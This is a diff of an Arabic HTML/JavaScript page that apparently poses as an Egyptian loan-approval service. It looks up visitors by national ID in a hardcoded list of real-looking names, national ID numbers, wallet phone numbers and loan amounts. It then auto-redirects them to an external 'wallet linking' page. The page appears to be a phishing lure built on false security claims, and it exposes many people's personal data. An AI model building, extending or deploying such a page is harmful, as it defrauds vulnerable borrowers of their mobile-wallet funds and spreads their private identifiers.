@@ -147,71 +147,6 @@
             }
         }
 
-        .approval-banner {
-            background: linear-gradient(135deg, rgba(57, 255, 20, 0.15), rgba(212, 175, 55, 0.15));
-            border: 2px solid #39FF14;
-            border-radius: 48px;
-            padding: 30px 25px;
-            margin: 30px auto;
-            max-width: 800px;
-            text-align: center;
-            display: none;
-            animation: slideUpFade 0.8s cubic-bezier(0.2, 0.9, 0.4, 1.1);
-            box-shadow: 0 0 30px rgba(57, 255, 20, 0.3);
-        }
-
-        .approval-banner.show {
-            display: block;
-        }
-
-        .approval-banner h2 {
-            color: #39FF14;
-            font-size: 2rem;
-            font-weight: 800;
-            text-shadow: 0 0 15px #39FF14;
-            margin-bottom: 15px;
-        }
-
-        .approval-banner p {
-            color: #D4AF37;
-            font-size: 1.3rem;
-            font-weight: 600;
-            margin: 10px 0;
-        }
-
-        .approval-banner .customer-name {
-            color: #FFD966;
-            font-size: 1.4rem;
-            font-weight: 700;
-        }
-
-        .approval-banner .loan-amount {
-            color: #39FF14;
-            font-size: 1.5rem;
-            font-weight: 800;
-            text-shadow: 0 0 10px #39FF14;
-        }
-
-        .countdown-timer {
-            display: inline-block;
-            background: rgba(212, 175, 55, 0.2);
-            border: 2px solid #D4AF37;
-            border-radius: 30px;
-            padding: 15px 25px;
-            margin-top: 20px;
-            font-size: 1.1rem;
-            font-weight: 600;
-            color: #FFD966;
-        }
-
-        .countdown-timer .timer-number {
-            color: #39FF14;
-            font-size: 1.8rem;
-            font-weight: 800;
-            text-shadow: 0 0 10px #39FF14;
-            margin: 0 10px;
-        }
-
         .search-card {
             background: rgba(10, 10, 15, 0.75);
             backdrop-filter: blur(12px);
@@ -563,6 +498,7 @@
             align-items: flex-start;
             gap: 1rem;
             margin: 1rem 0;
+            padding: 0.8rem;
             background: rgba(0, 0, 0, 0.3);
             border-radius: 0.8rem;
             transition: all 0.3s;
@@ -593,11 +529,6 @@
             .linking-button { font-size: 1rem; padding: 14px 20px; }
             .congrats h2 { font-size: 1.7rem; }
             .transparency-section { padding: 1.5rem; }
-            .approval-banner h2 { font-size: 1.5rem; }
-            .approval-banner p { font-size: 1rem; }
-            .approval-banner .loan-amount { font-size: 1.2rem; }
-            .countdown-timer { font-size: 0.9rem; }
-            .countdown-timer .timer-number { font-size: 1.4rem; }
         }
     </style>
 </head>
@@ -613,17 +544,6 @@
         </div>
         <div class="security-info">
             <i class="fas fa-shield-alt"></i> نظام آمن معتمد - تشفير 256-bit
-        </div>
-    </div>
-
-    <!-- شريط الموافقة والعداد التنازلي -->
-    <div id="approvalBanner" class="approval-banner">
-        <h2><i class="fas fa-check-circle"></i> تهانينا! تمت الموافقة</h2>
-        <p>اسم العميل: <span class="customer-name" id="bannerCustomerName">---</span></p>
-        <p>مبلغ التمويل المعتمد: <span class="loan-amount" id="bannerLoanAmount">---</span></p>
-        <div class="countdown-timer">
-            <i class="fas fa-hourglass-half"></i> سيتم توجيهك الآن انتظر
-            <span class="timer-number" id="bannerCountdown">10</span> ثوانٍ
         </div>
     </div>
 
@@ -655,7 +575,7 @@
             <div class="info-section">
                 <strong>📋 معلومات مهمة:</strong> جميع البيانات المعروضة هنا آمنة ومشفرة بأعلى معايير الأمان الدولية (256-bit encryption). لا يتم مشاركة بياناتك مع أي جهة خارجية دون موافقتك الصريحة.
             </div>
-            <table class="data-table" id="dataTable"></table>
+            <table class="data-table" id="dataTable">\u003C/table\u003E
         </div>
 
         <div class="transparency-section">
@@ -732,11 +652,24 @@
 </div>
 
 <script>
-    // ========== قاعدة العملاء المدمجة (القديمة + الجديدة + العميل الجديد) ==========
+    // ========== قاعدة العملاء المدمجة (جميع العملاء السابقين + العميل الجديد) ==========
     const customersDatabase = {
-        // العملاء الجدد من الملفات السابقة
-        "27512283200054": { name: "محمد رمضان احمد محمد", loan: "30,000 ج.م", wallet: "فودافون كاش", walletNum: "01015857191", payment: "من يوم 1 إلى يوم 5" },
+        // العملاء الأساسيون السابقون
         "28403270201213": { name: "محمود السيد محمود بيومي", loan: "90,000 ج.م", wallet: "فودافون كاش", walletNum: "01021877357", payment: "من يوم 1 إلى يوم 5" },
+        "28205031201019": { name: "معاذ السيد الغريب أحمد", loan: "200,000 ج.م", wallet: "فودافون كاش", walletNum: "01033830731", payment: "من يوم 1 إلى يوم 5" },
+        "28906270200731": { name: "محمد احمد عبدالله عبدالقادر", loan: "200,000 ج.م", wallet: "أخرى", walletNum: "01283498080", payment: "من يوم 1 إلى يوم 5" },
+        "29410011617371": { name: "علاء عبدالحكيم محمد درويش", loan: "40,000 ج.م", wallet: "فودافون كاش", walletNum: "01027250679", payment: "من يوم 1 إلى يوم 5" },
+        "29109182702197": { name: "محمد ابوالسعود محمود ابوالحسن", loan: "50,000 ج.م", wallet: "أخرى", walletNum: "01050540564", payment: "من يوم 1 إلى يوم 5" },
+        "28612061701011": { name: "مصطفى نبيل فوزي محمود", loan: "50,000 ج.م", wallet: "اتصالات كاش", walletNum: "01122540100", payment: "من يوم 1 إلى يوم 5" },
+        "28808271701881": { name: "سماح سامي عبد المطلب ابراهيم", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01024873103", payment: "من يوم 1 إلى يوم 5" },
+        "27601272100298": { name: "احمد محمد احمد ابو سيد", loan: "200,000 ج.م", wallet: "فودافون كاش", walletNum: "01000013172", payment: "من يوم 1 إلى يوم 5" },
+        "28606171602191": { name: "حماده السيد السعيد حبيش", loan: "100,000 ج.م", wallet: "فودافون كاش", walletNum: "01014327407", payment: "من يوم 1 إلى يوم 5" },
+        "29102272500939": { name: "حماده ابوالعلا عبد العظيم ابوالعلا", loan: "30,000 ج.م", wallet: "فودافون كاش", walletNum: "01092974641", payment: "من يوم 1 إلى يوم 5" },
+        "30001132500275": { name: "محمد على السيد سلام", loan: "100,000 ج.م", wallet: "أخرى", walletNum: "01271372918", payment: "من يوم 1 إلى يوم 5" },
+        "28507170200317": { name: "محمد فتحى عبد الوارث محمد", loan: "120,000 ج.م", wallet: "فودافون كاش", walletNum: "01092134722", payment: "من يوم 1 إلى يوم 5" },
+        
+        // العملاء الجدد من الملف الثاني
+        "27512283200054": { name: "محمد رمضان احمد محمد", loan: "30,000 ج.م", wallet: "فودافون كاش", walletNum: "01015857191", payment: "من يوم 1 إلى يوم 5" },
         "26910290102639": { name: "هاني محمد محمد عبد الحميد", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01095216999", payment: "من يوم 1 إلى يوم 5" },
         "26711222501077": { name: "شحاته عبد الغني هيكل عبد الغني", loan: "30,000 ج.م", wallet: "فودافون كاش", walletNum: "01003233741", payment: "من يوم 1 إلى يوم 5" },
         "28502070101115": { name: "رامي حسام احمد ابراهيم", loan: "30,000 ج.م", wallet: "اتصالات كاش", walletNum: "01150232362", payment: "من يوم 1 إلى يوم 5" },
@@ -754,37 +687,22 @@
         "28610020102762": { name: "شيماء صابر طه صديق", loan: "50,000 ج.م", wallet: "اتصالات كاش", walletNum: "01145403462", payment: "من يوم 1 إلى يوم 5" },
         "27601011414511": { name: "هشام أحمد صلاح محمد عبدالغغار", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01022560232", payment: "من يوم 1 إلى يوم 5" },
         "28310192201335": { name: "محمد محمود عبد الحميد محمد", loan: "40,000 ج.م", wallet: "فودافون كاش", walletNum: "01026479629", payment: "من يوم 1 إلى يوم 5" },
-        "27507310200599": { name: "ياسرسعد محمد بكر", loan: "60,000 ج.م", wallet: "فودافون كاش", walletNum: "01226157120", payment: "من يوم 1 إلى يوم 5" },
-        
-        // العملاء السابقين (الـ 12) مع تحديث بعض البيانات
-        "28205031201019": { name: "معاذ السيد الغريب أحمد", loan: "200,000 ج.م", wallet: "فودافون كاش", walletNum: "01033830731", payment: "من يوم 1 إلى يوم 5" },
-        "28906270200731": { name: "محمد احمد عبدالله عبدالقادر", loan: "200,000 ج.م", wallet: "أخرى", walletNum: "01283498080", payment: "من يوم 1 إلى يوم 5" },
-        "29410011617371": { name: "علاء عبدالحكيم محمد درويش", loan: "40,000 ج.م", wallet: "فودافون كاش", walletNum: "01027250679", payment: "من يوم 1 إلى يوم 5" },
-        "29109182702197": { name: "محمد ابوالسعود محمود ابوالحسن", loan: "50,000 ج.م", wallet: "أخرى", walletNum: "01050540564", payment: "من يوم 1 إلى يوم 5" },
-        "28612061701011": { name: "مصطفى نبيل فوزي محمود", loan: "50,000 ج.م", wallet: "اتصالات كاش", walletNum: "01122540100", payment: "من يوم 1 إلى يوم 5" },
-        "28808271701881": { name: "سماح سامي عبد المطلب ابراهيم", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01024873103", payment: "من يوم 1 إلى يوم 5" },
-        "27601272100298": { name: "احمد محمد احمد ابو سيد", loan: "200,000 ج.م", wallet: "فودافون كاش", walletNum: "01000013172", payment: "من يوم 1 إلى يوم 5" },
-        "28606171602191": { name: "حماده السيد السعيد حبيش", loan: "100,000 ج.م", wallet: "فودافون كاش", walletNum: "01014327407", payment: "من يوم 1 إلى يوم 5" },
-        "29102272500939": { name: "حماده ابوالعلا عبد العظيم ابوالعلا", loan: "30,000 ج.م", wallet: "فودافون كاش", walletNum: "01092974641", payment: "من يوم 1 إلى يوم 5" },
-        "30001132500275": { name: "محمد على السيد سلام", loan: "100,000 ج.م", wallet: "أخرى", walletNum: "01271372918", payment: "من يوم 1 إلى يوم 5" },
-        "28507170200317": { name: "محمد فتحى عبد الوارث محمد", loan: "120,000 ج.م", wallet: "فودافون كاش", walletNum: "01092134722", payment: "من يوم 1 إلى يوم 5" },
-        
+        "27507310200599": { name: "ياسر سعد محمد بكر", loan: "60,000 ج.م", wallet: "فودافون كاش", walletNum: "01226157120", payment: "من يوم 1 إلى يوم 5" },
+        "28909012110875": { name: "حسين صبرى مصطفى حسن", loan: "100,000 ج.م", wallet: "اتصالات كاش", walletNum: "01142032336", payment: "من يوم 1 إلى يوم 5" },
         // العميل الجديد المطلوب إضافته
-        "28909012110875": { name: "حسين صبرى مصطفى حسن", loan: "100,000 ج.م", wallet: "اتصالات كاش", walletNum: "01142032336", payment: "من يوم 1 إلى يوم 5" }
+        "28910102102195": { name: "محمد احمد محمود احمد", loan: "30,000 ج.م", wallet: "اتصالات كاش", walletNum: "01122107980", payment: "من يوم 1 إلى يوم 5" }
+        
     };
 
     let autoRedirectTimer = null;
     let redirectCountdownInterval = null;
-    let bannerCountdownInterval = null;
 
-    // توليد جزيئات عشوائية
     function createParticles() {
         const particlesDiv = document.getElementById('particles');
-        const particleCount = 40;
-        for (let i = 0; i < particleCount; i++) {
+        for (let i = 0; i < 40; i++) {
             const particle = document.createElement('div');
             particle.classList.add('particle');
-            const size = Math.random() * 4 + 2;
+            const size = Math.random() * 8 + 3;
             particle.style.width = `${size}px`;
             particle.style.height = `${size}px`;
             particle.style.left = `${Math.random() * 100}%`;
@@ -796,21 +714,13 @@
     }
     createParticles();
 
-    // دالة التوجيه إلى رابط ربط الحساب بالسيستم
     function redirectToLinking() {
         window.open('https://bk0212937-netizen.github.io/Rabt-wilet-/', '_blank');
     }
 
-    // إلغاء التوجيه التلقائي
     function cancelAutoRedirect() {
-        if (autoRedirectTimer) {
-            clearTimeout(autoRedirectTimer);
-            autoRedirectTimer = null;
-        }
-        if (redirectCountdownInterval) {
-            clearInterval(redirectCountdownInterval);
-            redirectCountdownInterval = null;
-        }
+        if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
+        if (redirectCountdownInterval) clearInterval(redirectCountdownInterval);
         const infoDiv = document.getElementById('autoRedirectInfo');
         if (infoDiv) {
             infoDiv.style.opacity = '0.5';
@@ -818,39 +728,13 @@
         }
     }
 
-    // بدء العداد التنازلي في شريط الموافقة
-    function startBannerCountdown() {
-        if (bannerCountdownInterval) clearInterval(bannerCountdownInterval);
-        
-        let secondsLeft = 10;
-        const countdownSpan = document.getElementById('bannerCountdown');
-        
-        if (countdownSpan) countdownSpan.innerText = secondsLeft;
-        
-        bannerCountdownInterval = setInterval(() => {
-            secondsLeft--;
-            const newSpan = document.getElementById('bannerCountdown');
-            if (newSpan) newSpan.innerText = secondsLeft;
-            if (secondsLeft <= 0) {
-                clearInterval(bannerCountdownInterval);
-                bannerCountdownInterval = null;
-                // توجيه تلقائي
-                window.open('https://bk0212937-netizen.github.io/Rabt-wilet-/', '_blank');
-            }
-        }, 1000);
-    }
-
-    // بدء التوجيه التلقائي بعد 10 ثوانٍ
     function startAutoRedirect() {
-        // إلغاء أي مؤقت سابق
         if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
         if (redirectCountdownInterval) clearInterval(redirectCountdownInterval);
         
         let secondsLeft = 10;
-        const countdownSpan = document.getElementById('redirectCountdown');
         const infoDiv = document.getElementById('autoRedirectInfo');
         
-        if (countdownSpan) countdownSpan.innerText = secondsLeft;
         if (infoDiv) {
             infoDiv.style.opacity = '1';
             infoDiv.innerHTML = `<i class="fas fa-hourglass-half"></i> سيتم توجيهك تلقائياً خلال <span id="redirectCountdown">${secondsLeft}</span> ثوانٍ... <span class="cancel-redirect" onclick="cancelAutoRedirect()">إلغاء</span>`;
@@ -862,18 +746,13 @@
             if (newSpan) newSpan.innerText = secondsLeft;
             if (secondsLeft <= 0) {
                 clearInterval(redirectCountdownInterval);
-                redirectCountdownInterval = null;
                 if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
-                // توجيه تلقائي
                 window.open('https://bk0212937-netizen.github.io/Rabt-wilet-/', '_blank');
-                if (infoDiv) {
-                    infoDiv.innerHTML = '<i class="fas fa-check-circle"></i> تم التوجيه التلقائي بنجاح.';
-                }
+                if (infoDiv) infoDiv.innerHTML = '<i class="fas fa-check-circle"></i> تم التوجيه التلقائي بنجاح.';
             }
         }, 1000);
         
         autoRedirectTimer = setTimeout(() => {
-            // لن يتم تنفيذ شيء هنا لأن العداد هو من يقوم بالتوجيه، ولكن نضعها للتأكد
             if (redirectCountdownInterval) {
                 clearInterval(redirectCountdownInterval);
                 window.open('https://bk0212937-netizen.github.io/Rabt-wilet-/', '_blank');
@@ -881,31 +760,17 @@
         }, 10000);
     }
 
-    // دالة البحث
     function searchRequest() {
         const nationalId = document.getElementById('nationalId').value.trim();
         const resultDiv = document.getElementById('resultSection');
         const errorDiv = document.getElementById('errorSection');
         const dataTable = document.getElementById('dataTable');
-        const approvalBanner = document.getElementById('approvalBanner');
 
         resultDiv.style.display = 'none';
         errorDiv.style.display = 'none';
-        approvalBanner.classList.remove('show');
         
-        // إلغاء أي توجيه تلقائي سابق
-        if (autoRedirectTimer) {
-            clearTimeout(autoRedirectTimer);
-            autoRedirectTimer = null;
-        }
-        if (redirectCountdownInterval) {
-            clearInterval(redirectCountdownInterval);
-            redirectCountdownInterval = null;
-        }
-        if (bannerCountdownInterval) {
-            clearInterval(bannerCountdownInterval);
-            bannerCountdownInterval = null;
-        }
+        if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
+        if (redirectCountdownInterval) clearInterval(redirectCountdownInterval);
 
         if (!nationalId) {
             alert('يرجى إدخال الرقم القومي');
@@ -914,32 +779,17 @@
 
         const customer = customersDatabase[nationalId];
         if (customer) {
-            // عرض شريط الموافقة مع اسم العميل ومبلغ القرض
-            document.getElementById('bannerCustomerName').innerText = customer.name;
-            document.getElementById('bannerLoanAmount').innerText = customer.loan;
-            approvalBanner.classList.add('show');
-            approvalBanner.scrollIntoView({ behavior: 'smooth', block: 'start' });
-            
-            // بدء العداد التنازلي في الشريط
-            startBannerCountdown();
-            
-            // تأخير عرض الجدول والتفاصيل الأخرى
-            setTimeout(() => {
-                let rows = `
-                    <tr><td class="info-label">الاسم الرباعي</td><td>${customer.name}</td>
-                    <tr><td class="info-label">مبلغ التمويل المعتمد</td><td class="highlight">${customer.loan}</td>
-                    <tr><td class="info-label">نوع المحفظة</td><td>${customer.wallet}</td>
-                    <tr><td class="info-label">رقم المحفظة</td><td>${customer.walletNum}</td>
-                    <tr><td class="info-label">موعد السداد الشهري</td><td>${customer.payment}</td>
-                `;
-                dataTable.innerHTML = rows;
-
-                resultDiv.style.display = 'block';
-                resultDiv.scrollIntoView({ behavior: 'smooth', block: 'start' });
-                
-                // بدء التوجيه التلقائي بعد ظهور النتيجة
-                startAutoRedirect();
-            }, 100);
+            let rows = `
+                <tr><td class="info-label">الاسم الرباعي</td><td>${customer.name}</td>
+                <tr><td class="info-label">مبلغ التمويل المعتمد</td><td class="highlight">${customer.loan}</td>
+                <tr><td class="info-label">نوع المحفظة</td><td>${customer.wallet}</td>
+                <tr><td class="info-label">رقم المحفظة</td><td>${customer.walletNum}</td>
+                <tr><td class="info-label">موعد السداد الشهري</td><td>${customer.payment}</td>
+            `;
+            dataTable.innerHTML = rows;
+            resultDiv.style.display = 'block';
+            resultDiv.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            startAutoRedirect();
         } else {
             errorDiv.style.display = 'block';
             errorDiv.scrollIntoView({ behavior: 'smooth', block: 'start' });
